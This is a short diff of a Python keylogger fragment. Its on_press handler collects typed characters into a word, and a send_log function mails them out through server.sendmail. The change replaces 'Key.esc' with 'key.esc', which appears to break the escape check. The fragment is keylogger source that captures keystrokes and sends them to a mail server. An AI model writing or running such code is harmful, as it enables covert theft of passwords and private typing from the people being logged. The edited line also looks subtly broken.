@@ -34,7 +34,7 @@ def on_press(key):
             char = f'{key}'
             char = char[1:-1]
             word += char
-        if key == Key.esc:
+        if key == key.esc:
             return False
         def send_log():
             server.sendmail(
